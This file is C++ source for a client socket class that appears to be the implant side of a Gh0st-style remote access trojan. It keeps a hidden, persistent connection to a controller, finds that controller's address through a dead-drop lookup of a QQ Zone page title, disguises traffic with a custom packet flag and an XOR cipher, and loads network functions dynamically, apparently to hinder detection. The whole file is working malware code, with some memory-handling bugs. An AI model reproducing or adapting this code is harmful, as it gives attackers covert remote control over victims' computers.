// ClientSocket.cpp: implementation of the CClientSocket class.
//
//////////////////////////////////////////////////////////////////////

#include "StdAfx.h"
#include "ClientSocket.h"
#include "zlib/zlib.h"
#include <process.h>
#include <MSTcpIP.h>
#include "Manager.h"
#include "until.h"
#pragma comment(lib, "ws2_32.lib")


//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////
#define ZLIB_NO  0001		//数据包无压缩模式
#define ZLIB_OK  0002		//数据包为压缩模式

CClientSocket::CClientSocket()
{
	try
	{
		throw 0;
	}
	catch (...)
	{
		WSADATA wsaData;
		WSAStartup(MAKEWORD(2, 2), &wsaData);
		
		m_hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
		m_bIsRunning = false;
		m_Socket = INVALID_SOCKET;
		// Packet Flag;
		BYTE bPacketFlag[] = {'h', 'x', ' '};
		memcpy(m_bPacketFlag, bPacketFlag, sizeof(bPacketFlag));
	}
}

CClientSocket::~CClientSocket()
{
	m_bIsRunning = false;
	WaitForSingleObject(m_hWorkerThread, INFINITE);

	if (m_Socket != INVALID_SOCKET)
		Disconnect();

	CloseHandle(m_hWorkerThread);
	CloseHandle(m_hEvent);

	WSACleanup();
}

int CClientSocket::memfind(const char *mem, const char *str, int sizem, int sizes)   
{   
	int   da,i,j;   
	if (sizes == 0) da = strlen(str);   
	else da = sizes;   
	for (i = 0; i < sizem; i++)   
	{   
		for (j = 0; j < da; j ++)   
			if (mem[i+j] != str[j])	break;   
			if (j == da) return i;   
	}   
	return -1;   
}

char* CClientSocket::substr(char   *str,int   istar,int   iend) 
{
	char   *p; 
	char   p1[100]={0}; 
	int   ip=0; 
    if(p!=NULL) 
    { 
		p=NULL; 
    } 
    p=str; 
    ip=strlen(p); 
    if(istar> ip) 
		return   NULL; 
    else 
    { 
		p+=istar-1; 
    } 
    int   ipp=strlen(p); 
    if(ipp <iend) 
		lstrcpy(p1,p); 
    else 
    { 
        //p1+=iend; 
		memcpy(p1,p,iend); 
    }
	lstrcpy(str,p1);
    return   str; 
	
} 

int ReplaceStr(char* sSrc, char* sMatchStr, char* sReplaceStr)
{
	int StringLen;
	char caNewString[64];
	char* FindPos;
	FindPos =(char *)strstr(sSrc, sMatchStr);
	if( (!FindPos) || (!sMatchStr) )
		return -1;
	
	while( FindPos )
	{
		memset(caNewString, 0, sizeof(caNewString));
		StringLen = FindPos - sSrc;
		my_strncpy(caNewString, sSrc, StringLen);
		lstrcat(caNewString, sReplaceStr);
		lstrcat(caNewString, FindPos + strlen(sMatchStr));
		lstrcpy(sSrc, caNewString);
		
		FindPos =(char *)strstr(sSrc, sMatchStr);
	}
	return 0;
}



#include <wininet.h>
#pragma comment(lib,"Wininet.lib")

char* CClientSocket::QQToIP(LPCSTR ch)
{
	if (lstrlen(ch) == 0)
	{
		return NULL;
	}
	CHAR szUrl[MAX_PATH] = {0};
	wsprintf(szUrl,"http://user.qzone.qq.com/%s",ch);
	CHAR szAgent[] = "";
	HINSTANCE hdlldes = LoadLibrary("wininet.dll"); 
	
	typedef HINTERNET (WINAPI *NETOPEN)(LPCTSTR ,DWORD, LPCTSTR, LPCTSTR ,DWORD) ; 
	NETOPEN myNetOpen= (NETOPEN)GetProcAddress(hdlldes, "InternetOpenA");
	
	typedef HINTERNET (WINAPI *NETOPENURL)(HINTERNET ,LPCTSTR ,LPCTSTR ,DWORD ,DWORD ,DWORD_PTR ); 
	NETOPENURL 	myNetOpenUrl= (NETOPENURL)GetProcAddress(hdlldes, "InternetOpenUrlA");
	
	typedef BOOL (WINAPI *APIS)(HINTERNET ,LPVOID ,DWORD ,LPDWORD ); 
	APIS myapis; 
	myapis= (APIS)GetProcAddress(hdlldes, "InternetReadFile"); 
	typedef BOOL (WINAPI *NETCLOSE)(HINTERNET hInternet); 
	NETCLOSE  myNetClose= (NETCLOSE  )GetProcAddress(hdlldes,"InternetCloseHandle"); 
		


	HINTERNET hInternet1 =
		myNetOpen(NULL,INTERNET_OPEN_TYPE_PRECONFIG,NULL,NULL,NULL);
	if (NULL == hInternet1)
	{
		myNetClose(hInternet1);

		if (hdlldes)
		{
			FreeLibrary(hdlldes);
		}
		return NULL;
	}
	HINTERNET hInternet2 =
		InternetOpenUrl(hInternet1,szUrl,NULL,NULL,INTERNET_FLAG_NO_CACHE_WRITE,NULL);
	if (NULL == hInternet2)
	{
		myNetClose(hInternet2);
		myNetClose(hInternet1);
		if (hdlldes)
		{
			FreeLibrary(hdlldes);
		}
		return NULL;
	}
	DWORD dwMaxDataLength = 500;
	char pBuf[500] = {0};
	if (NULL == pBuf)
	{
		myNetClose(hInternet2);
		myNetClose(hInternet1);
		if (hdlldes)
		{
			FreeLibrary(hdlldes);
		}
		return NULL;
	}
	DWORD dwReadDataLength = NULL;
	BOOL bRet = TRUE;

	ZeroMemory(pBuf,dwMaxDataLength*sizeof(TCHAR));
	bRet = myapis(hInternet2,pBuf,dwMaxDataLength,&dwReadDataLength);

	
	DWORD SizePoint;
	SizePoint = memfind(pBuf,"<title>",sizeof(pBuf),0);
	if (SizePoint == -1)
	{
		if (hdlldes)
		{
			FreeLibrary(hdlldes);
		}
		return NULL;
	}

	substr(pBuf,SizePoint+8,15);
	ReplaceStr(pBuf," ","");
	ReplaceStr(pBuf,"[","");
	ReplaceStr(pBuf,"h","");
	ReplaceStr(pBuf,"t","");
	ReplaceStr(pBuf,"p","");
	if (hdlldes)
	{
		FreeLibrary(hdlldes);
	}
	
	return pBuf;
}

int IPorUrl(char *ipaddr)//判断是IP还是域名
{
	char *pnum,*pdot=ipaddr;
	for(;*ipaddr;ipaddr=pdot++)
	{
		int t=0,e=1;
		if(*(pnum=pdot)=='.')return 0;
		for(; *pdot!='.'&&*pdot; ++pdot);
		for(ipaddr=pdot-1;ipaddr>=pnum;t+=e*(*ipaddr---'0'),e*=10);
		if(t<0||t>255||(pdot-pnum==3&&t<100)||(pdot-pnum==2&&t<10))
			return 0;
	}
	return 1;
}

 char* CClientSocket::UrlToIP(LPCSTR ch)
{
	if (lstrlen(ch) == 0)
	{
		return NULL;
	}
	if (IPorUrl((char*)ch))
	{
		return (char*)ch;
	}

	char lpurl[MAX_PATH] = {0};
    char *cSrvName= "ip.cn";
	struct sockaddr_in srv_addr;
	
    SOCKET cli_sock=socket(PF_INET,SOCK_STREAM,0);
	if (cli_sock==INVALID_SOCKET)
		return NULL;// connect to server
	
    srv_addr.sin_family= AF_INET;
	
    LPHOSTENT lphost= gethostbyname(cSrvName);
    if (lphost!= NULL) 
		srv_addr.sin_addr.s_addr= ((LPIN_ADDR)lphost->h_addr)->s_addr;
	
    srv_addr.sin_port= htons(80);
	
	if (connect(cli_sock,(LPSOCKADDR)&srv_addr,sizeof(srv_addr))==SOCKET_ERROR)
		return NULL; 
	
    wsprintfA(lpurl,"GET /index.php?ip=%s HTTP/1.1\n"
		"Host: ip.cn\n"
		"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg\n"
		"Accept-Language: zh-cn\n"
		"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; );\n\n\n"
		,ch);
	
    int  retval = send(cli_sock,lpurl,sizeof(lpurl)-1,0);
	
    if( SOCKET_ERROR == retval )  
		return NULL;
	
    char buffer[1000];
	char *ip_start = NULL;
	
	for(;;)  
    {
        memset(buffer,0,sizeof(buffer));
        retval= recv(cli_sock ,buffer,sizeof(buffer),0);
		
		if (retval <= 0)
			break;
		
		if(strstr(buffer,"<code>")!= 0)
		{
			char *ip_stop=strstr(buffer,"</code>");//IP端尾部指针赋值
			*ip_stop='\0';//截断
			
			ip_start=strstr(buffer,"e>")+2;//ip段开始部分指针赋值
			break;
		}
    }
	
    closesocket(cli_sock);
	
	return ip_start;
}

bool CClientSocket::Connect(LPCTSTR lpszHost, UINT nPort)
{
	// 一定要清除一下，不然socket会耗尽系统资源
	Disconnect();
	// 重置事件对像
	ResetEvent(m_hEvent);
	m_bIsRunning = false;
	
	m_Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	
	if (m_Socket == SOCKET_ERROR)   
	{ 
		return false;   
	}

	
	hostent* pHostent = NULL;
    pHostent = gethostbyname(lpszHost);
	
	if (pHostent == NULL)
	{
		return false;
	}
	// 构造sockaddr_in结构
	sockaddr_in	ClientAddr;
	ClientAddr.sin_family	= AF_INET;
	ClientAddr.sin_port	= htons(nPort);
	ClientAddr.sin_addr = *((struct in_addr *)pHostent->h_addr);

	if (connect(m_Socket, (SOCKADDR *)&ClientAddr, sizeof(ClientAddr)) == SOCKET_ERROR) 
	{
		return false;
	}


	try
	{
		throw 1;
	}
	catch (...)
	{
		BOOL   bConditionalAccept=TRUE;   
		DWORD  dwBytes;
		// Set KeepAlive 开启保活机制, 防止服务端产生死连接
		if (setsockopt(m_Socket, SOL_SOCKET, SO_KEEPALIVE, (const   char*)&bConditionalAccept, sizeof(BOOL)) == 0)
		{
			// 设置超时详细信息
			tcp_keepalive	klive;
			klive.onoff = 1; // 启用保活
			klive.keepalivetime = 1000 * 60 * 3; // 3分钟超时 Keep Alive
			klive.keepaliveinterval = 1000 * 5; // 重试间隔为5秒 Resend if No-Reply
			WSAIoctl(m_Socket, SIO_KEEPALIVE_VALS,&klive,sizeof(tcp_keepalive),NULL,0,&dwBytes,0,NULL);
		}
	}



	m_bIsRunning = TRUE;
	m_hWorkerThread = (HANDLE)MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, (LPVOID)this, 0, NULL);
	
	return true;
}



char* MyDecode(char *data,int len)
{
	for (int i = 0; i < len; i++)
	{
		data[i] += 0x86;
		data[i] ^= 0x19;
	}
	return data;
}

DWORD WINAPI CClientSocket::WorkThread(LPVOID lparam)   
{	
	CClientSocket *pThis = (CClientSocket *)lparam;

	char	buff[MAX_RECV_BUFFER];
	fd_set fdSocket;
	FD_ZERO(&fdSocket);
	FD_SET(pThis->m_Socket, &fdSocket);
	while (pThis->IsRunning())
	{

		fd_set fdRead = fdSocket;
		int nRet = select(NULL, &fdRead, NULL, NULL, NULL);
		if (nRet == SOCKET_ERROR)
		{
			pThis->Disconnect();
			break;
		}

		if (nRet > 0)
		{
			memset(buff, 0, sizeof(buff));
			int nSize = recv(pThis->m_Socket, buff, sizeof(buff), 0);
			if (nSize <= 0)
			{
				pThis->Disconnect();
				break;
			}	

			if (nSize > 0) 
			{
				MyDecode(buff,nSize);

				pThis->OnRead((LPBYTE)buff, nSize);

			}
		}
	}
	return -1;
}

void CClientSocket::run_event_loop()
{
	WaitForSingleObject(m_hEvent, INFINITE);
}

bool CClientSocket::IsRunning()
{
	return m_bIsRunning;
}

void CClientSocket::OnRead( LPBYTE lpBuffer, DWORD dwIoSize )
{
	PBYTE pData = NULL;
	PBYTE pDeCompressionData = NULL;
	try
	{
		Sleep(0);
		if (dwIoSize == FLAG_SIZE && memcmp(lpBuffer, m_bPacketFlag, FLAG_SIZE) == 0)
		{
			// 重新发送	
			Send(m_ResendWriteBuffer.GetBuffer(), m_ResendWriteBuffer.GetBufferLen());
			return;
		}
		

		// Add the message to out message
		// Dont forget there could be a partial, 1, 1 or more + partial mesages
		m_CompressionBuffer.Write(lpBuffer, dwIoSize);

		// Check real Data
		while (m_CompressionBuffer.GetBufferLen() > HDR_SIZE)
		{
			// Check real Data
			BYTE bPacketFlag[FLAG_SIZE];
			CopyMemory(bPacketFlag, m_CompressionBuffer.GetBuffer(), sizeof(bPacketFlag));
			
			if (memcmp(m_bPacketFlag, bPacketFlag, sizeof(m_bPacketFlag)) != 0)
			{
				throw 1;
			}

			UINT nSize = 0;
			CopyMemory(&nSize, m_CompressionBuffer.GetBuffer(FLAG_SIZE), sizeof(UINT));
			
			if (nSize && (m_CompressionBuffer.GetBufferLen()) >= nSize)
			{
				int nUnCompressLength = 0;
				// Read off header
				m_CompressionBuffer.Read((PBYTE) bPacketFlag, sizeof(bPacketFlag));
				m_CompressionBuffer.Read((PBYTE) &nSize, sizeof(int));
				m_CompressionBuffer.Read((PBYTE) &nUnCompressLength, sizeof(int));
				BOOL nSomp = FALSE;
				m_CompressionBuffer.Read((PBYTE) &nSomp, sizeof(BOOL));   
				////////////////////////////////////////////////////////
				////////////////////////////////////////////////////////
				// SO you would process your data here
				// 
				// I'm just going to post message so we can see the data
				int	nCompressLength = nSize - HDR_SIZE;
				pData = new BYTE[nCompressLength];
				pDeCompressionData = new BYTE[nUnCompressLength];
				
				if (pData == NULL || pDeCompressionData == NULL)
				{
					throw 2;
				}

				m_CompressionBuffer.Read(pData, nCompressLength);

				if(nSomp == ZLIB_NO)  //只接收没压缩数据
				{
					m_DeCompressionBuffer.ClearBuffer();

					m_DeCompressionBuffer.Write(pData, nCompressLength);
					m_pManager->OnReceive(m_DeCompressionBuffer.GetBuffer(0), m_DeCompressionBuffer.GetBufferLen());
				}
								
				delete [] pData;
				delete [] pDeCompressionData;
			}
			else
				break;
		}
	}
	catch(...)
	{
		if(pData) delete [] pData;
		if(pDeCompressionData) delete [] pDeCompressionData;
		m_CompressionBuffer.ClearBuffer();
		Send(NULL, 0);
	}
}

void CClientSocket::Disconnect()
{
    //
    // If we're supposed to abort the connection, set the linger value
    // on the socket to 0.
    //
	
    LINGER lingerStruct;
    lingerStruct.l_onoff = 1;
    lingerStruct.l_linger = 0;
    setsockopt(m_Socket, SOL_SOCKET, SO_LINGER, (char *)&lingerStruct, sizeof(lingerStruct) );
	
	CancelIo((HANDLE) m_Socket);
	InterlockedExchange((LPLONG)&m_bIsRunning, false);
	closesocket(m_Socket);
	
	SetEvent(m_hEvent);	
	
	m_Socket = INVALID_SOCKET;
}

int CClientSocket::Send( LPBYTE lpData, UINT nSize )
{
	m_WriteBuffer.ClearBuffer();

	if (nSize > 0)
	{
		// Compress data
		unsigned long	destLen = nSize;
		LPBYTE			pDest = new BYTE[destLen];

		if (pDest == NULL)
			return 0;

		CopyMemory(pDest,lpData, nSize);
		
		//////////////////////////////////////////////////////////////////////////
		LONG nBufLen = destLen + HDR_SIZE;
		// 5 bytes packet flag
		m_WriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));
		// 4 byte header [Size of Entire Packet]
		m_WriteBuffer.Write((PBYTE) &nBufLen, sizeof(nBufLen));
		// 4 byte header [Size of UnCompress Entire Packet]
		m_WriteBuffer.Write((PBYTE) &nSize, sizeof(nSize));
		BOOL nComp = ZLIB_NO;  //无压缩数据
		m_WriteBuffer.Write((PBYTE) &nComp, sizeof(BOOL));         //写入数据不压缩标志  4 bytes
		// Write Data
		m_WriteBuffer.Write(pDest, destLen);

		delete [] pDest;
		
		// 发送完后，再备份数据, 因为有可能是m_ResendWriteBuffer本身在发送,所以不直接写入
		LPBYTE lpResendWriteBuffer = new BYTE[nSize];
		CopyMemory(lpResendWriteBuffer, lpData, nSize);
		m_ResendWriteBuffer.ClearBuffer();
		m_ResendWriteBuffer.Write(lpResendWriteBuffer, nSize);	// 备份发送的数据
		if (lpResendWriteBuffer)
			delete [] lpResendWriteBuffer;
	}
	else // 要求重发, 只发送FLAG
	{
		m_WriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));
		m_ResendWriteBuffer.ClearBuffer();
		m_ResendWriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));	// 备份发送的数据	
	}
	// 分块发送
	return SendWithSplit(m_WriteBuffer.GetBuffer(), m_WriteBuffer.GetBufferLen(), MAX_SEND_BUFFER);
}

char* MyEncode(char *data,int len)
{
	for (int i = 0; i < len; i++)
	{
		data[i] ^= 0x19;
		data[i] -= 0x86;
	}
	return data;
}

int CClientSocket::SendWithSplit(LPBYTE lpData, UINT nSize, UINT nSplitSize)
{
	MyEncode((char *)lpData,nSize);
	int			nRet = 0;
	const char	*pbuf = (char *)lpData;
	int			size = 0;
	int			nSend = 0;
	int			nSendRetry = 15;
	// 依次发送
	for (size = nSize; size >= nSplitSize; size -= nSplitSize)
	{
		for (int i = 0; i < nSendRetry; i++)
		{
			nRet = send(m_Socket, pbuf, nSplitSize, 0);
			if (nRet > 0)
				break;
		}
		if (i == nSendRetry)
		{

			return -1;
		}
		nSend += nRet;
		pbuf += nSplitSize;
		Sleep(10); // 必要的Sleep,过快会引起控制端数据混乱
	} 
	// 发送最后的部分
	if (size > 0)
	{
		for (int i = 0; i < nSendRetry; i++)
		{
			nRet = send(m_Socket, (char *)pbuf, size, 0);
			if (nRet > 0)
				break;
		}
		if (i == nSendRetry)
		{
			return -1;
		}
		nSend += nRet;
	}


	if (nSend == nSize)
		return nSend;
	else
		return SOCKET_ERROR;
}

void CClientSocket::SetManagerCallBack( CManager *pManager )
{
	m_pManager = pManager;
}
